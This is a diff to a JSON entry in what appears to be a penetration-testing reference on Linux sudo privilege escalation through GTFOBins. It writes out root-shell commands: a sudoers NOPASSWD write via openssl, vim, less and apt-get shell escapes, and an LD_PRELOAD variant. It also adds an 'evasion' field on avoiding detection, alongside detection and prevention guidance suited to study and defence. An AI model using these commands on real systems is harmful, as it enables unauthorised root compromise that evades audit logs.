@@ -30,11 +30,11 @@
       "command": "echo \"htb-student ALL=(ALL) NOPASSWD:ALL\" | base64 | sudo /usr/bin/openssl enc -d -a -out /etc/sudoers.d/htb-student"
     },
     {
-      "label": "OSCP Ch17 \u2014 apt-get GTFOBins escape: changelog spawns less, then shell",
+      "label": "OSCP Ch17 — apt-get GTFOBins escape: changelog spawns less, then shell",
       "command": "sudo apt-get changelog apt\n# In the pager, type:\n!/bin/sh"
     }
   ],
-  "notes": "sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed \u2014 check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "notes": "sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed — check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
   "references": [
     {
       "title": "GTFOBins",
@@ -79,7 +79,7 @@
     "why_it_works": "Many sudo entries allow running specific commands as root. GTFOBins documents how legitimate binaries (vim, find, less, python, awk, nmap, etc.) can be used to spawn shells when run with sudo. Even seemingly restricted sudo entries can be abused if the allowed binary has shell escape or command execution capabilities.",
     "prerequisites": "Any sudo privilege (even for a single command). The allowed command has a GTFOBins-listed shell escape or command execution vector.",
     "impact": "Root shell via sudo-privileged binary abuse. Enables full system compromise from a single misconfigured sudo entry.",
-    "detection": "Unusual use of sudo-allowed commands to spawn shell processes (sudo vim \u2192 :!bash). Auditd: bash/sh spawned as child of sudo-executed binary. SIEM: interactive shell spawned from normally batch-only processes.",
+    "detection": "Unusual use of sudo-allowed commands to spawn shell processes (sudo vim → :!bash). Auditd: bash/sh spawned as child of sudo-executed binary. SIEM: interactive shell spawned from normally batch-only processes.",
     "artifacts": "Sudo log (/var/log/auth.log): sudo execution of allowed binary | Process tree: vim/find/python -> /bin/bash as root",
     "prevention": "Review all sudo entries against GTFOBins. Avoid granting sudo access to any binary with shell escape capabilities unless absolutely necessary. Use 'NOEXEC' sudo flag to prevent command execution from within allowed binaries. Use strict sudo rules: specify exact command flags (e.g., /usr/bin/find /specific/path -type f) rather than unlimited arguments.",
     "misconfiguration": "sudoers grants unrestricted access to binaries with GTFOBins shell escapes: 'htb-student ALL=(ALL) NOPASSWD: /usr/bin/vim' or 'ALL=(ALL) NOPASSWD: ALL'.",
@@ -89,6 +89,27 @@
       "HTB M25",
       "MITRE T1548.003",
       "MITRE T1059"
-    ]
-  }
+    ],
+    "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
+  },
+  "variations": [
+    {
+      "label": "GTFOBins lookup for an allowed binary",
+      "command": "# https://gtfobins.github.io/#+sudo  -> find the escape for the binary in sudo -l"
+    },
+    {
+      "label": "Preserve-env / LD_PRELOAD",
+      "command": "sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "List what you can run as sudo",
+      "command": "sudo -l"
+    },
+    {
+      "label": "Abuse an allowed binary to get a root shell",
+      "command": "# e.g. sudo vim -c ':!/bin/sh'  |  sudo less /etc/profile then !/bin/sh"
+    }
+  ]
 }
